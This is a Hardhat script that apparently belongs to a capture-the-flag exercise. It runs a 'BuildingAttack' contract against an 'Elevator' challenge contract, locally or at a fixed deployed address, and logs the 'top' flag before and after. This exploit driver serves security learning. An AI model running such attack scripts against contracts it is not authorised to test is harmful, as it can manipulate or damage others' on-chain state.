import { ethers, network } from "hardhat";
import { BuildingAttack, Elevator } from "../typechain-types";

async function main() {
  let elevator: Elevator;
  const [_attacker] = await ethers.getSigners();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const buidingAttack: BuildingAttack = await ethers.getContract(
    "BuildingAttack"
  );

  if (isLocalTest) {
    elevator = await ethers.getContract("Elevator");
  } else {
    elevator = await ethers.getContractAt(
      "Elevator",
      "0x52fAA1Cd6a9E395A88Aa197fe56042fe7814296F"
    );
  }

  console.log("Before the attack:");

  await check();

  const tx = await buidingAttack.attack();

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After the attack:");

  await check();

  async function check() {
    const top = await elevator.top();
    console.log(`Top?: ${top}`);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
